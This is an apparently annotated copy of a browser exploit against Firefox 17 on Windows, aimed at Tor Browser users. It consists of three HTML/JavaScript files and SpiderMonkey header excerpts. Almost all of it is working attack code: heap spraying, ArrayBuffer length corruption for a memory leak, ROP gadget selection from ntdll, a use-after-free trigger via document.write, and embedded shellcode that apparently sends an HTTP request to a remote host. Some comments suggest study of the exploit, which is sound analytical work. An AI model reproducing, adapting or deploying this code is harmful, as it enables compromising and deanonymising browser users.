--- js/src/vm/ObjectImpl.h
/*
 * Header structure for object element arrays. This structure is immediately
 * followed by an array of elements, with the elements member in an object
 * pointing to the beginning of that array (the end of this structure).
 * See below for usage of this structure.
 */
class ObjectElements {
    /* Number of allocated slots. */
    uint32_t capacity;

    /*   
     * Number of initialized elements. This is <= the capacity, and for arrays
     * is <= the length. Memory for elements above the initialized length is
     * uninitialized, but values between the initialized length and the proper
     * length are conceptually holes.
     */
    uint32_t initializedLength;

    /* 'length' property of array objects, unused for other objects. */
    uint32_t length;

    /* :XXX: bug 586842 store state about sparse slots. */
    uint32_t unused;
}

--- js/src/vm/ObjectImpl.h
class ElementsHeader
{
  protected:
    uint32_t type;
    uint32_t length; /* Array length, ArrayBuffer length, typed array length */

    union {
        class {
            friend class DenseElementsHeader;
            uint32_t initializedLength;
            uint32_t capacity;
        } dense;
        class {
            friend class SparseElementsHeader;
            Shape * shape;
        } sparse;
    };   
    ...

--- content_1.html:

<script>
var MAGIC_ARRAY_LENGTH = 0xB0;
var var2 = new Array(MAGIC_ARRAY_LENGTH); // ArrayBuffers of size MAGIC_LENGTH1
var var3 = new Array(MAGIC_ARRAY_LENGTH); // Int32Array views into var2's ArrayBuffers
var var4 = new Array(MAGIC_ARRAY_LENGTH); // (Sparse?) Array of Arrays of size 0x1ed00
 
var MAGIC_LENGTH1 = 0xFF004;
 
var OVERWRITTEN_ARRAYBUFFER_LENGTH = 0x60000000;
 
var var9 = 1;
 
var var10 = 0x12000000;
var var11 = 0;
var is_ff17 = false;
 
var var13 =0;
 
function return_address()
{
        if (!is_ff17) {
                return 0x00000000;
        }
        var var14 = var10 + 0x00010000 * var11 + 0x0000002B;
 
        if( var9 == 1 || var9 == 2)
                return ( var14 - 0xe8);
        else
                return 0x00000000;
}
 
function determine_ff_version_compatiblity()
{
        var version = get_firefox_major_version();
        if (version < 17)
                window.location.href="content_1.html";
        if (version ==17)
                is_ff17 = true;
}
 
function load_iframe_content2()
{
        var iframe = document.getElementById("iframe");
        iframe.src = "content_2.html";
}
 
function initialize_infoleak_arrays()
{
        for(var j = 0; j < MAGIC_ARRAY_LENGTH; j++)
        {
                // Ensure var4 is a sparse array?
                if(j < MAGIC_ARRAY_LENGTH/8 || j == MAGIC_ARRAY_LENGTH-1) // j < 22 || j == 175
                {
                        var tabb = new Array(0x1ED00);
                        var4[j] = tabb;
                        for(i=0; i<0x1ED00; i++)
                        {
                                var4[j][i]=0x11559944;
                        }
                }
                var2[j] = new ArrayBuffer(MAGIC_LENGTH1);
        }
        for(var j = 0; j < MAGIC_ARRAY_LENGTH; j++)
        {
                var3[j] = new Int32Array(var2[j], 0, MAGIC_LENGTH1 / 4);
                var3[j][0] = 0x11336688;
 
                for(var i=1;i<16;i++)
                {
                        var3[j][0x4000*i] = 0x11446688;
                }
 
        }
 
        for(var j = 0; j < MAGIC_ARRAY_LENGTH ;j++)
        {
                if(typeof var4[j] !="undefined")
                {
                        var4[j][0]=0x22556611;
                }
        }
}
 
function f(var15,view,var16)
{
        // See http://tsyrklevich.net/tbb_payload.txt for a description of the payload
        var magneto = ("\ufc60\u8ae8"+"\u0000\u6000"+"\ue589\ud231"+"\u8b64\u3052"+"\u528b\u8b0c"+"\u1452\u728b"+"\u0f28\u4ab7"+"\u3126\u31ff"+"\uacc0\u613c"+"\u027c\u202c"+"\ucfc1\u010d"+"\ue2c7\u52f0"+"\u8b57\u1052"+"\u428b\u013c"+"\u8bd0\u7840"+"\uc085\u4a74"+"\ud001\u8b50"+"\u1848\u588b"+"\u0120\ue3d3"+"\u493c\u348b"+"\u018b\u31d6"+"\u31ff\uacc0"+"\ucfc1\u010d"+"\u38c7\u75e0"+"\u03f4\uf87d"+"\u7d3b\u7524"+"\u58e2\u588b"+"\u0124\u66d3"+"\u0c8b\u8b4b"+"\u1c58\ud301"+"\u048b\u018b"+"\u89d0\u2444"+"\u5b24\u615b"+"\u5a59\uff51"+"\u58e0\u5a5f"+"\u128b\u86eb"+"\u5d05\ubd81"+"\u02e9\u0000"+"\u4547\u2054"+"\u7075\u858d"+"\u02d1\u0000"+"\u6850\u774c"+"\u0726\ud5ff"+"\uc085\u5e74"+"\u858d\u02d8"+"\u0000\u6850"+"\u774c\u0726"+"\ud5ff\uc085"+"\u4c74\u90bb"+"\u0001\u2900"+"\u54dc\u6853"+"\u8029\u006b"+"\ud5ff\udc01"+"\uc085\u3675"+"\u5050\u5050"+"\u5040\u5040"+"\uea68\udf0f"+"\uffe0\u31d5"+"\uf7db\u39d3"+"\u74c3\u891f"+"\u6ac3\u8d10"+"\ue1b5\u0002"+"\u5600\u6853"+"\ua599\u6174"+"\ud5ff\uc085"+"\u1f74\u8dfe"+"\u0089\u0000"+"\ue375\ubd80"+"\u024f\u0000"+"\u7401\ue807"+"\u013b\u0000"+"\u05eb\u4de8"+"\u0001\uff00"+"\ub8e7\u0100"+"\u0000\uc429"+"\ue289\u5052"+"\u6852\u49b6"+"\u01de\ud5ff"+"\u815f\u00c4"+"\u0001\u8500"+"\u0fc0\uf285"+"\u0000\u5700"+"\uf9e8\u0000"+"\u5e00\uca89"+"\ubd8d\u02e9"+"\u0000\uebe8"+"\u0000\u4f00"+"\ufa83\u7c20"+"\uba05\u0020"+"\u0000\ud189"+"\uf356\ub9a4"+"\u000d\u0000"+"\ub58d\u02c4"+"\u0000\ua4f3"+"\ubd89\u024b"+"\u0000\u565e"+"\ua968\u3428"+"\uff80\u85d5"+"\u0fc0\uaa84"+"\u0000\u6600"+"\u488b\u660a"+"\uf983\u0f04"+"\u9c82\u0000"+"\u8d00\u0c40"+"\u008b\u088b"+"\u098b\u00b8"+"\u0001\u5000"+"\ue789\uc429"+"\ue689\u5657"+"\u5151\u4868"+"\ud272\uffb8"+"\u85d5\u81c0"+"\u04c4\u0001"+"\u0f00\u0fb7"+"\uf983\u7206"+"\ub96c\u0006"+"\u0000\u10b8"+"\u0000\u2900"+"\u89c4\u89e7"+"\ud1ca\u50e2"+"\u3152\u8ad2"+"\u8816\u24d0"+"\uc0f0\u04e8"+"\u093c\u0477"+"\u3004\u02eb"+"\u3704\u0788"+"\u8847\u24d0"+"\u3c0f\u7709"+"\u0404\ueb30"+"\u0402\u8837"+"\u4707\ue246"+"\u59d4\ucf29"+"\ufe89\u0158"+"\u8bc4\u4bbd"+"\u0002\uf300"+"\uc6a4\u4f85"+"\u0002\u0100"+"\u2ee8\u0000"+"\u3100\u50c0"+"\u2951\u4fcf"+"\u5357\uc268"+"\u38eb\uff5f"+"\u53d5\u7568"+"\u4d6e\uff61"+"\ue9d5\ufec8"+"\uffff\uc931"+"\ud1f7\uc031"+"\uaef2\ud1f7"+"\uc349\u0000"+"\u0000\u8d00"+"\ue9bd\u0002"+"\ue800\uffe4"+"\uffff\ub94f"+"\u004f\u0000"+"\ub58d\u0275"+"\u0000\ua4f3"+"\ubd8d\u02e9"+"\u0000\ucbe8"+"\uffff\uc3ff"+"\u0a0d\u6f43"+"\u6e6e\u6365"+"\u6974\u6e6f"+"\u203a\u656b"+"\u7065\u612d"+"\u696c\u6576"+"\u0a0d\u6341"+"\u6563\u7470"+"\u203a\u2f2a"+"\u0d2a\u410a"+"\u6363\u7065"+"\u2d74\u6e45"+"\u6f63\u6964"+"\u676e\u203a"+"\u7a67\u7069"+"\u0a0d\u0a0d"+"\u8300\u0ec7"+"\uc931\ud1f7"+"\uc031\uaef3"+"\uff4f\u0de7"+"\u430a\u6f6f"+"\u696b\u3a65"+"\u4920\u3d44"+"\u7377\u5f32"+"\u3233\u4900"+"\u4850\u504c"+"\u5041\u0049"+"\u0002\u5000"+"\ude41\u36ca"+"\u4547\u2054"+"\u312f\u3866"+"\u6134\u3165"+"\u2d64\u6230"+"\u3531\u342d"+"\u6434\u2d63"+"\u3939\u3336"+"\u382d\u6362"+"\u3739\u3131"+"\u3430\u3935"+"\u2030\u5448"+"\u5054\u312f"+"\u312e\u0a0d"+"\u6f48\u7473"+"\u203a\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u0000"+"\u0000\u9000"+"");
        var var29 = magneto;
        var var17 = "\u9060";
        var var18 = "\u9061";
        var var19 = "\uC481\u0000\u0008" ;
        var var20 = "\u2589\u3000"+String.fromCharCode((var13 >> 16)  & 0x0000FFFF);
        var var21="\u258B\u3000"+String.fromCharCode((var13 >> 16)  & 0x0000FFFF);
        var var22 = "\uE589";
        var var23 ="\uC3C9";
        var var24  = "\uE889";
        var24 += "\u608D\u90C0";
 
        var var25 = var10 + 0x00010000 * var11 + 0x00000030 + 0x00100000;
        var var26 = var25 + var16*4
 
        var var27 =""
        var27 += "\uB890\u2020\u2020";
        var27 += "\uA390"+ae(var26+0x00);
        var27 += "\uA390"+ae(var26+0x04);
        var27 += "\uA390"+ae(var26+0x08);
        var27 += "\uA390"+ae(var26+0x0C);
 
        var var28  = var17;
        var28 += var20;
        var28 += var19;
        var28 += var22;
        var28 += var27;
        var28 += var29;
        var28 += var21;
        var28 += var18;
        var28 += var23;
        var var29Array = new Array();
        var29Array=ag(var28);
 
        var var29Ad = var13+0x5010;
        var i=0;
        var j=0;
        var var30=var13+0x4048;
        var var31 = new Array();
 
        var31[0]=var30;
        var31[1]=var30;
        var31[2]=var30;
        var31[3]=var15[1];
        var31[4]=var29Ad;
        var31[5]=0xFFFFFFFF;
        var31[6]=var13+0x4044;
        var31[7]=var13+0x4040;
        var31[8]=0x00000040;
        var31[9]=var13+0x4048;
        var31[10]=0x00040000;
        var31[11]=var29Ad;
        var31[12]=var13+0x301C;
 
        for(var i=0 ; i < 0x140 ; i++)
        {
                var31[i+15]=var15[0];
        }
        var var32 = 0x3F8;
        view[0x800+0+var32]=var13+0x4018;
        view[0x800+1+var32]=var13+0x4018;
        for(var i=2 ; i < var31.length  ; i++)
        {
                view[0x800+i+var32]=  0x41414141;
        }
        for(var i=0 ; i < var31.length  ; i++)
        {
                view[0xC02+i+var32]=  var31[i];
        }
        for(var i=0 ; i < var29Array.length ; i++)
        {
                view[0x1000 + i+var32] = var29Array[i];
        }
 
}
 
function g(var50,view)
{
        var k = h(var50,view);
        var j=0;
        if( k < 0 )
                return -1;
        view[0x404+k]=var13+0x3010;
        return 1;
}
 
function h(var50,view)
{
        var address=0;
        var u=0;
        var memory="";
        var var55=0;
        for( u =7; u >=4 ;u--)
        {
                address=view[0x404+u];
                if( address > 0x000A0000 && address < 0x80000000 )
                {
                        memory = i(address,0x48,var50,view);
                        var55 = two_utf16_chars_to_uint32(memory[0x14]+memory[0x15]);
                        if(var55==address)
                        {
                                return u;
                        }
                }
        }
        return -1;
}
 
function i(address,size,var50,view)
{
        var var56 = size/2;
        var56 = var56*0x10 +0x04;
        view[0x400]=var56;
        view[0x401]=address;
        return var4[var50][0];
}
 
function j(memory,view)
{
        var intArray=ag(memory);
        for(var i=0; i < intArray.length; i++)
        {
                view[0x404+i]=intArray[i];
        }
}
 
function get_corrupted_infoleak_array_index()
{
        for(var j=0; j<MAGIC_ARRAY_LENGTH; j++)
        {
                if(var2[j].byteLength != MAGIC_LENGTH1)
                {
                        return j;
                }
        }
        return -1;
}
 
function m(view,var58)
{
        view[var58] = 0x00000000;
        for(var j=0; j < MAGIC_ARRAY_LENGTH ;j++)
        {
                if(typeof var4[j] !="undefined")
                {
                        if(var4[j][0] != 0x22556611)
                                return j;
                }
        }
        return -1
}
 
function n(view,firstvar58)
{
        var var57 = var10 + 0x00100000 + 0x00010000 * var11;
        var var58 = 0;
        for(var i=0; i < 200; i++)
        {
                if(view[var58] != 0x11336688) {
                        if(view[var58] == 0x22556611 )
                                return var58;
                        else
                                return -1;
                }

                if(var58 == 0) {
                        var58 = firstvar58;
                } else {
                        var var59 = view[var58-0x0C];
                        var58 = (var59 - var57)/4;
                }
        }
        return -1;
}
 
function o(var60)
{
        var view  = new Int32Array(var2[var60], 0, 0x00040400);
 
        var var59 = view[0x00100000/4 - 0x0C];
        var var57 = var10 + 0x00100000 + 0x00010000 * var11;
 
        return ((var59 - var57)/4);
}
 
function p()
{
        for(var j=0; j < MAGIC_ARRAY_LENGTH; j++) {
                for(var i=1; i < 16; i++) {
                        if(var3[j][i*0x4000-0x02] == 0x01000000) {
                                return -i;
                        }
                }
        }
        return 0;
}
 
// Given an index (var60) to an array in var2 with an overly long length, write and corrupt the next
//  array in var2 to make it's length huge and return the index on success.
function corrupt_next_arrays_size(var60)
{
        var view  = new Int32Array(var2[var60],0,0x00040400);
        view[0x00100000/4 - 0x02] = OVERWRITTEN_ARRAYBUFFER_LENGTH;
        if(var2[var60+1].byteLength == OVERWRITTEN_ARRAYBUFFER_LENGTH)
                return var60+1;
        return -1;
}
 
function uncorrupt_arrays_size(var60)
{
        var view  = new Int32Array(var2[var60],0,0x00040400);
        view[0x00100000/4-0x02] = MAGIC_LENGTH1;
}
 
function entry_point()
{
        if (typeof sessionStorage.tempStor == "undefined") // Mutex so exploit only runs once??
        {
                sessionStorage.tempStor="";
                var9 = 1;
                determine_ff_version_compatibility();
                initialize_infoleak_arrays();
                load_iframe_content2();
        }
}
 
function v()
{
        if(get_corrupted_infoleak_array_index() == -1) {
                var11 = p();
                var9 = 2;
                load_iframe_content2();
        } else {
                x();
        }
}
 
function w()
{
        if (var9 == 1)
                v();
        else
                x();
}
 
function x()
{
        var var60 = get_corrupted_infoleak_array_index();
        if(var60 == -1)
                return;
 
        var nextvar60 = corrupt_next_arrays_size(var60);
        if (nextvar60 == -1)
                return;
 
        var var61 = o(var60);
        var var62 = new Int32Array(var2[nextvar60],0,var8 / 4);
        var var58 = n(var62,var61);
        if(var58 == -1)
                return;
 
        var var50 = m(var62,var58);
 
        var13 = var10 + 0x00100000 + 0x00010000 * var11;

        for(var i=0; i < 0x400; i++) {
                var62[i] = var13+0x1010;
        }
        var62[0x44]=0x0;
        var62[0x45]=0x0;

        // Instance of JSString?
        var62[0x400]=0x00004004; // lengthAndFlags = (length)0x400<<4 | FIXED_FLAGS?
        var62[0x401]=0x7FFE0300; // Pointer to a pointer to ntdll!KiFastSystemCall (on modern systems)
 
        var62[var58] = var13 + 0x1030;
        var62[var58+1] = 0xFFFFFF85; // (JSValueTag)JSVAL_TAG_STRING
 
        var var64 = var4[var50][0]; // String from ntdll
 
        ac(var64,var50,var62,var58,var60);
}
 
function y(index)
{
        var4[index][1]= document.createElement('span');
}
 
function z(index,index2)
{
        var4[index][1].innerHTML;
}
 
function aa(view,var63)
{
        return view[var63];
}
 
function ab(address,view,var63)
{
        view[var63]=address;
}
 
 
function ac(var64,var50,var62,var58,var60)
{
        var var15 = leaked_ntdll_data_to_rop_gadget(var64);
 
        f(var15,var62,var58);
 
        y(var50);
        var var66 = aa(var62,var58+2);
 
        var var67 = i(var66,0x40,var50,var62) ;
        j(var67,var62);
 
        g(var50,var62);
        ab(var13+0x1040 ,var62,var58+2);
 
        uncorrupt_arrays_size(var60)
        setTimeout(free_infoleak_arrays, 1000);
        z(var50);
}
 
 
function free_infoleak_arrays()
{
        for(var j=0;j<MAGIC_ARRAY_LENGTH;j++)
        {
                delete var3[j]
                var3[j]= null;
 
                delete var2[j];
                var2[j] = null;
 
                if(typeof var4[j] !="undefined")
                {
                        delete var4[j];
                        var4[j] = null;
                }
        }
        delete var2;
        delete var3;
        delete var4;
        var2 = null;
        var3 = null;
        var4 = null;
}
 
function ae(int32)
 {
    var var68 = String.fromCharCode((int32)& 0x0000FFFF);
    var var69 = String.fromCharCode((int32 >> 16)  & 0x0000FFFF);
    return var68+var69;
}
 
 
function two_utf16_chars_to_uint32(string)
{
    var var70 = string.charCodeAt(0);
    var var71 = string.charCodeAt(1);
    var var72 = (var71 << 16) + var70;
    return var72;
}
 
function ag(string)
{
        if(string.length%2!=0)
                string+="\u9090";
        var intArray= new Array();
        for(var i=0 ; i*2 < string.length; i++)
                intArray[i] = two_utf16_chars_to_uint32(string[i*2]+string[i*2+1]);
        return intArray;
}
 
 
function leaked_ntdll_data_to_rop_gadget(var73)
{
    var var74 = var73.substring(0,2);
    var var70 = var74.charCodeAt(0);
    var var71 = var74.charCodeAt(1);
    var var75 = (var71 << 16) + var70;
    if (var75 == 0)
    {
        var var76 = var73.substring(32, 34);
        var var70 = var76.charCodeAt(0);
        var var71 = var76.charCodeAt(1);
        var75 = (var71 << 16) + var70;
    }
    var var15 = determine_rop_gadget(var75);
    if (var15 == -1)
    {
        return;
    }
    return var15
}
 
// Make sure it's TBB, return the Firefox major version (minor is hidden by TBB)
function get_firefox_major_version()
{
        if (navigator.userAgent.indexOf("Windows NT") == -1)
            return -1;

        var ua = navigator.userAgent;
        var browser = ua.substring(0, ua.lastIndexOf("/"));
        browser = browser.substring(browser.lastIndexOf(" ") + 1);
        if (browser != "Firefox")
                return -1;
 
        var version = ua.substring(ua.lastIndexOf("/") + 1);
        version = parseInt(version.substring(0, version.lastIndexOf(".")));
        return version;
}
 
// Turn info leaked data into which ROP gadgets we should use.
function determine_rop_gadget(var77)
{
    var var15 = new Array(2);
    if (var77 % 0x10000 == 0xE510)
    {
        var78 = var77 - 0xE510;
        var15[0] = var78 + 0xE8AE;
        var15[1] = var78 + 0xD6EE;
    }
    else if (var77 % 0x10000 == 0x9A90)
    {
        var78 = var77 - 0x69A90;
        var15[0] = var78 + 0x6A063;
        var15[1] = var78 + 0x68968;
    }
    else if (var77 % 0x10000 == 0x5E70)
    {
        var78 = var77 - 0x65E70;
        var15[0] = var78 + 0x66413;
        var15[1] = var78 + 0x64D34;
    }
    else if (var77 % 0x10000 == 0x35F3)
    {
        var78 = var77 - 0x335F3;
        var15[0] = var78 + 0x4DE13;
        var15[1] = var78 + 0x49AB8;
    }
    else if (var77 % 0x10000 == 0x5CA0)
    {
        var78 = var77 - 0x65CA0;
        var15[0] = var78 + 0x66253;
        var15[1] = var78 + 0x64B84;
    }
    else if (var77 % 0x10000 == 0x5CD0)
    {
        var78 = var77 - 0x65CD0;
        var15[0] = var78 + 0x662A3;
        var15[1] = var78 + 0x64BA4;
 
    }
    else if (var77 % 0x10000 == 0x6190)
    {
        var78 = var77 - 0x46190;
        var15[0] = var78 + 0x467D3;
        var15[1] = var78 + 0x45000;
 
    }
    else if (var77 % 0x10000 == 0x9CB9)
    {
        var78 = var77 - 0x29CB9;
        var15[0] = var78 + 0x29B83;
        var15[1] = var78 + 0xFFC8;
    }
    else if (var77 % 0x10000 == 0x9CE9)
    {
        var78 = var77 - 0x29CE9;
        var15[0] = var78 + 0x29BB3;
        var15[1] = var78 + 0xFFD8;
    }
    else if (var77 % 0x10000 == 0x70B0)
    {
        var78 = var77 - 0x470B0;
        var15[0] = var78 + 0x47733;
        var15[1] = var78 + 0x45F18;
    }
    else if (var77 % 0x10000 == 0x7090)
    {
        var78 = var77 - 0x47090;
        var15[0] = var78 + 0x476B3;
        var15[1] = var78 + 0x45F18;
    }
    else if (var77 % 0x10000 == 0x9E49)
    {
        var78 = var77 - 0x29E49;
        var15[0] = var78 + 0x29D13;
        var15[1] = var78 + 0x10028;
    }
    else if (var77 % 0x10000 == 0x9E69)
    {
        var78 = var77 - 0x29E69;
        var15[0] = var78 + 0x29D33;
        var15[1] = var78 + 0x10018;
    }
 
    else if (var77 % 0x10000 == 0x9EB9)
    {
        var78 = var77 - 0x29EB9;
        var15[0] = var78 + 0x29D83;
        var15[1] = var78 + 0xFFC8;
    }
    else
    {
        return -1;
    }
 
    return var15;
}
 
window.addEventListener("onload", entry_point(), true);
 
</script>
 
 
--- content_2.html:
 
<html><body></body></html><script>
var y="?????";
var url=window.location.href;
if (0 > url.indexOf(y)) {
  var iframe=document.createElement("iframe");
  iframe.src="content_3.html";
  document.body.appendChild(iframe)
}
else
  parent.w();

function return_address() {
  return parent.return_address()
};
</script>
 
 
--- content_3.html:
 
<script>
var y="?????";
var z="<body><img height='1' width='1' src='error.html' onerror=\"javascript: window.location.href='content_2.html"+y+"';\" ></body>";
var flag = !1;
var var83=0;

function initialize_uaf_arrays() {
  var d = Array(1024), e = Array(1024);
  for(var c = 0; c < 1024; c++)
    e[c]=new ArrayBuffer(180); // 180 + 16 (ArrayBufferObject storage header size) = 196 bytes (DocumentViewerImpl size)

  for(c = 0; c < 1024; c++) {
    d[c]=new Int32Array(e[c],0,45);
    d[c][9]=var83;
  }

  return d
}

function trigger_uaf() {
  !1==flag && (flag=!0,window.stop());
  window.stop();
  initialize_uaf_arrays();
  window.parent.frames[0].frameElement.ownerDocument.write(z);
  initialize_uaf_arrays();
}

var83=parent.return_address();
0 != var83 && document.addEventListener("readystatechange", trigger_uaf, !1);
</script>
